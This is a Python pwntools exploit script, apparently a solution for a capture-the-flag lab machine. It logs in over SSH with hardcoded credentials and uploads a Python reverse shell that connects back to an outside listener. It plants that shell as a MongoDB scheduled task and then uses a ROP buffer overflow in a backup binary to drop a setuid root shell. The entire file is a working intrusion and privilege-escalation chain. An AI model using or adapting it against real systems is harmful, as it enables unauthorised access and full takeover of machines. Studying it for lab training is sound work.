#!/usr/bin/env python2
import time
from pwn import *
from subprocess import call

DEBUG = False
RHOST = "10.10.10.58"
RPORT = 22
RPATH = "/dev/shm/.a/"
LHOST = "10.10.15.150"
LPORT = 60000

if DEBUG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

with open("rootshell.c", "wt") as f:
    f.write("""#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    system("/bin/sh");
    return 0;
}
""")
    f.close()

if call(["gcc", "rootshell.c", "-o", "rootshell"]) == 0:
    log.info("Compilation of rootshell was successful")

mark_shell = ssh(host=RHOST, port=RPORT, user='mark', password='5AYRft73VtFpc84k')
log.info("User: "+mark_shell['whoami'])
mark_shell.download_file("/usr/local/bin/backup",local="./backup")
elf = ELF('./backup')
rop = ROP(elf)
rop.system(next(elf.search('/tmp/.backup')))
rop.exit()
log.info(rop.dump())
payload = "A"*(512) + str(rop)
log.info(mark_shell["mkdir -p "+RPATH])
mark_shell.upload_data("import os, pty, socket\n" 
"lhost = '" + LHOST + "'\n"
"lport =  " + str(LPORT) + "\n"
"\n"
"def main():\n"
"    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
"    s.connect((lhost, lport))\n"
"    os.dup2(s.fileno(),0)\n"
"    os.dup2(s.fileno(),1)\n"
"    os.dup2(s.fileno(),2)\n"
"    os.putenv('HISTFILE','/dev/null')\n"
"    pty.spawn('/bin/bash')\n"
"    s.close()\n"
"\n"
"if __name__ == '__main__':\n"
"    main()\n", remote=RPATH+"shell.py")

log.info(mark_shell.upload_data(payload,remote=RPATH+"pld"))
log.info(mark_shell.upload_file("rootshell",RPATH+"rootshell"))

mongodb = mark_shell.run("mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k")
mongodb.recv()
mongodb.sendline("db.tasks.insertOne({cmd:'/usr/bin/python2 /dev/shm/.a/shell.py'});")
tom_shell = listen(LPORT).wait_for_connection()
tom_shell.clean(0)
tom_shell.sendline("cp "+RPATH+"rootshell /tmp/.backup_%i")
tom_shell.recv()
tom_shell.sendline("chmod +x /tmp/.backup_%i")
tom_shell.recv()
tom_shell.sendline("/usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(cat "+RPATH+"pld)")
tom_shell.interactive()
